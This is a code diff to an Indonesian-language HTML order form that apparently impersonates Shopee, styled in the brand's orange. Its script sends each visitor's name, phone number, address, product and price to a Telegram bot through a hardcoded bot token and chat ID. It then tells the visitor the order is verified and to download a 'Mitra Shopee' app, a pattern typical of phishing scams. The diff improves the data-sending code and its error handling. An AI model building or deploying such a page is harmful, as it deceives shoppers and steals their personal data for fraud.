@@ -8,6 +8,85 @@
     <link rel="stylesheet" href="style.css">
     <!-- Font Awesome untuk ikon -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        body {
+            background-color: #EE7A39;
+            /* Warna oranye Shopee */
+            color: black;
+            /* Warna teks utama menjadi hitam */
+        }
+
+        .container {
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            margin: 20px auto;
+            max-width: 600px;
+            padding: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group label {
+            display: block;
+            font-weight: bold;
+            margin-bottom: 5px;
+            color: black;
+            /* Warna label menjadi hitam */
+        }
+
+        .form-group input[type="text"],
+        .form-group input[type="tel"],
+        .form-group input[type="number"],
+        .form-group textarea {
+            width: 100%;
+            padding: 8px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 14px;
+            color: black;
+            /* Warna teks input menjadi hitam */
+        }
+
+        .form-group textarea {
+            resize: vertical;
+        }
+
+        button {
+            background-color: #EE7A39;
+            /* Warna oranye Shopee */
+            color: white;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        button:hover {
+            background-color: #d6652d;
+        }
+
+        /* Mengubah warna ikon motor */
+        .logo i {
+            color: #EE7A39;
+            /* Warna oranye Shopee */
+        }
+
+        h1,
+        p {
+            color: black;
+            /* Warna judul dan paragraf menjadi hitam */
+        }
+
+        h2 {
+            color: black;
+            /* Warna "Informasi Pemesan" menjadi hitam */
+        }
+    </style>
 </head>
 
 <body>
@@ -35,7 +114,8 @@
                     </div>
                     <div class="form-group">
                         <label for="nomorTelepon">Nomor Telepon *</label>
-                        <input type="tel" id="nomorTelepon" placeholder="08xxxxxxxxxx" required pattern="[0-9]{10,13}">
+                        <input type="tel" id="nomorTelepon" placeholder="08xxxxxxxxxx" required
+                            pattern="[0-9]{10,13}">
                     </div>
                     <div class="form-group">
                         <label for="alamatLengkap">Alamat Lengkap *</label>
@@ -43,19 +123,14 @@
                             required></textarea>
                     </div>
                     <div class="form-group">
-                        <label for="Nama produk">Nama produk *</label>
-                        <input type="text" id="nama produk" placeholder="Masukkan nama produk (contoh: Honda Beat)"
+                        <label for="namaProduk">Nama Produk *</label>
+                        <input type="text" id="namaProduk" placeholder="Masukkan nama produk (contoh: Honda Beat)"
                             required>
                     </div>
                     <div class="form-group">
-                        <label for="harga ">Harga  *</label>
-                        <input type="number" id="harga " placeholder="Masukkan harga" required
-                            min="100000" max="100000000">
-                    </div>
-                    <div class="form-group">
-                        <label for="sukuCadang">Suku Cadang yang Dibutuhkan *</label>
-                        <textarea id="sukuCadang" placeholder="Masukkan daftar suku cadang yang dibutuhkan" rows="4"
-                            required></textarea>
+                        <label for="harga">Harga *</label>
+                        <input type="number" id="harga" placeholder="Masukkan harga" required min="100000"
+                            max="100000000">
                     </div>
                     <button type="submit" id="verifikasiButton">Verifikasi Pemesanan</button>
                 </form>
@@ -67,30 +142,39 @@
         document.addEventListener('DOMContentLoaded', function () {
             document.getElementById('orderForm').addEventListener('submit', function (event) {
                 event.preventDefault();
+
                 // Ambil data input
                 var nama = document.getElementById('namaLengkap').value.trim();
                 var telepon = document.getElementById('nomorTelepon').value.trim();
                 var alamat = document.getElementById('alamatLengkap').value.trim();
-                var nama produk = document.getElementById('nama produk').value.trim();
+                var namaProduk = document.getElementById('namaProduk').value.trim();
                 var harga = document.getElementById('harga').value.trim();
-                var sukuCadang = document.getElementById('sukuCadang').value.trim();
+
+                // Validasi data (opsional, tapi disarankan)
+                if (!nama || !telepon || !alamat || !namaProduk || !harga) {
+                    alert('Harap isi semua kolom yang diperlukan.');
+                    return;
+                }
+
                 // Kirim ke Telegram
                 var token = "8483832719:AAH9MrWjVVmMxydfTMJjOPyG_c7xu04P6Gk";
-                var chat_id = "5923031825";
+                var chatId = "5923031825"; // Pastikan ini adalah string
                 var text =
                     "Formulir Pemesanan Suku Cadang Motor:\n" +
                     "Nama: " + nama + "\n" +
                     "Telepon: " + telepon + "\n" +
                     "Alamat: " + alamat + "\n" +
-                    "nama produk: " + nama produk + "\n" +
-                    "harga: " + harga + "\n" +
-                    "Suku Cadang yang Dibutuhkan: " + sukuCadang;
+                    "Nama Produk: " + namaProduk + "\n" +
+                    "Harga: " + harga;
+
                 // URL endpoint Telegram yang benar
                 var url = "https://api.telegram.org/bot" + token + "/sendMessage";
+
                 var params = {
-                    chat_id: chat_id,
+                    chat_id: chatId, // Pastikan ini adalah string
                     text: text
                 };
+
                 fetch(url, {
                     method: "POST",
                     headers: {
@@ -98,7 +182,12 @@
                     },
                     body: JSON.stringify(params)
                 })
-                    .then(response => response.json())
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error('Gagal mengirim ke Telegram: ' + response.status + ' ' + response.statusText);
+                        }
+                        return response.json();
+                    })
                     .then(data => {
                         if (data.ok) {
                             alert('Selamat! Data pemesanan Anda telah diverifikasi. Silahkan download aplikasi Mitra Shopee di Shopee.');
@@ -108,7 +197,8 @@
                             alert('Gagal mengirim ke Telegram: ' + data.description);
                         }
                     })
-                    .catch((error) => {
+                    .catch(error => {
+                        console.error("Gagal koneksi ke Telegram: " + error);
                         alert("Gagal koneksi ke Telegram: " + error);
                     });
             });
